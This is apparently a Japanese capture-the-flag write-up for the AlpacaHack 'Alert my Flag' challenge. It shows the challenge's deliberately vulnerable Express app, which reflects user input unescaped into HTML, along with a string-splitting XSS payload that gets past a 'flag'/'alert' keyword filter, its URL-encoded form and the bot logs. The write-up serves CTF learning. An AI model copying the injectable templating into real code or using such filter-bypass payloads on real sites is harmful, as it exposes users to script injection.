# Alert my Flag

## 問題
https://alpacahack.com/daily/challenges/alert-my-flag

```
# compose.yaml
services:
  web:
    build:
      context: ./web
    restart: unless-stopped
    init: true
    environment:
      - PORT=3000
      - FLAG=Alpaca{REDACTED}
    ports:
      - ${PORT:-3000}:3000

```

```
// index.js
import express from "express";
import cookie from "cookie-parser";
import rateLimit from "express-rate-limit";
import puppeteer from "puppeteer";

const PORT = process.env.PORT ?? "1337";
const APP_URL = `http://localhost:${PORT}/`;
const FLAG = process.env.FLAG ?? "Alpaca{fake_flag}";

const sleep = async (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const visit = async (url) => {
  console.log(`Start visiting: ${url}`);

  const browser = await puppeteer.launch({
    headless: "new",
    pipe: true,
    executablePath: "/usr/bin/chromium",
    args: [
      "--no-sandbox",
      "--disable-setuid-sandbox",
      "--disable-dev-shm-usage",
      "--disable-gpu",
      '--js-flags="--noexpose_wasm"',
    ],
  });

  let successful = false;
  try {

    await browser.setCookie({
      "name": "flag",
      "value": FLAG,
      "domain": new URL(APP_URL).hostname,
      "path": "/",
      "httpOnly": true,
    });

    const page = await browser.newPage();
    page.on('dialog', async dialog => {
      const message = dialog.message();
      const type = dialog.type()
      console.log(`Dialog message: ${message}`);
      console.log(`Dialog type: ${type}`);
      
      if(type === "alert" && message === FLAG) {
        successful = true;
      }
      await dialog.accept();
    });
    await page.goto(url, { timeout: 5000 });
    await sleep(3000);
    await page.close();
  } catch (e) {
    console.error(e);
  }

  await browser.close();

  console.log(`End visiting: ${url}`);

  return successful;
};

const app = express();
app.set("view engine", "ejs");

app.use(express.urlencoded({extended: false}))
app.use(cookie())

app.get("/", async (req, res) => {

  const flag = req.cookies.flag ?? "fake_flag";

  const username = req.query.username ?? "guest";

  let result;
  if(username.includes("flag") || username.includes("alert")) {
    result = "<p>invalid input</p>";
  } else {
    result = `<h1>Hello ${username}!</h1>`
  }

  const html = `<!DOCTYPE html>
<html>
<head>
  <script>const flag="${flag}";</script>
</head>
<body>
  ${result}
  <p>Try <a href="/?username=<i>admin</i>">this page?</a>
  <p>Was "alert(flag)" successful? <form action="/report" method="POST"><input hidden id="username" name="username"><button>Submit this page!</button></form></p>
  <script>
    document.getElementById("username").value = new URLSearchParams(location.search).get("username")</script>
</body>
</html>`;
  return res.send(html);
});

app.use(
  "/report",
  rateLimit({
    windowMs: 60 * 1000,
    max: 3,
  })
);

app.post("/report", async (req, res) => {
  const { username } = req.body;
  if (typeof username !== "string") {
    return res.status(400).send("Invalid username");
  }

  const url = `${APP_URL}?username=${encodeURIComponent(username)}`;

  try {
    const result = await visit(url);
    return res.send(result ? FLAG : "Failed...");
  } catch (e) {
    console.error(e);
    return res.status(500).send("Something wrong");
  }
});

app.listen(PORT, () => {
  console.log(`Listening on http://localhost:${PORT}`);
});
```
## 解法

指定されたURLに接続すると http://34.170.146.252:59059

下のようなページが表示される。

<img width="347" height="195" alt="image" src="https://github.com/user-attachments/assets/54041a27-7e97-4b64-934c-5441f6480833" />

「this page?」のリンクを押してみると以下のような表示になる。

<img width="440" height="194" alt="image" src="https://github.com/user-attachments/assets/25709e53-d6a2-4883-affb-0e79a7bca18a" />

alert(flag)をJavaScriptで実行させたいが、flagやalertが含まれてる場合はじかれるので、
```
if(username.includes("flag") || username.includes("alert")) {
```
以下のように文字を分割するようにする。hello.pyでalert(flag)をURLエンコードして出力する。
```
# hello.py
import urllib.parse
payload = "<script>window['al'+'ert'](eval('fl'+'ag'))</script>"
print(urllib.parse.quote(payload))
```
hello.pyを実行すると、
```
python3 hello.py
```
以下が表示される。
```
%3Cscript%3Ewindow%5B%27al%27%2B%27ert%27%5D%28eval%28%27fl%27%2B%27ag%27%29%29%3C/script%3E
```
/?username=の後ろに先ほどhello.pyで出力されたものを張り付けてアクセスすると、
```
http://34.170.146.252:59059/?username=%3Cscript%3Ewindow%5B%27al%27%2B%27ert%27%5D%28eval%28%27fl%27%2B%27ag%27%29%29%3C/script%3E
```

下図のようにダイアログが表示される。

<img width="691" height="170" alt="image" src="https://github.com/user-attachments/assets/496c4fb1-5746-41fc-b173-1f4a367f5f1d" />

ダイアログOkを押した後は下のように表示される。

<img width="660" height="190" alt="image" src="https://github.com/user-attachments/assets/2268e66a-857b-4326-8e39-aa69127eceec" />

そのままsubmitを押すとフラグが表示される。

<img width="338" height="93" alt="image" src="https://github.com/user-attachments/assets/715a0af5-d619-4c09-9019-ef447fc120fd" />


※http://localhost:3000
docker compose up
web-1  | Start visiting: http://localhost:3000/?username=%3Cscript%3Ewindow%5B'al'%2B'ert'%5D(eval('fl'%2B'ag'))%3C%2Fscript%3E
web-1  | Dialog message: Alpaca{REDACTED}
web-1  | Dialog type: alert
web-1  | End visiting: http://localhost:3000/?username=%3Cscript%3Ewindow%5B'al'%2B'ert'%5D(eval('fl'%2B'ag'))%3C%2Fscript%3E






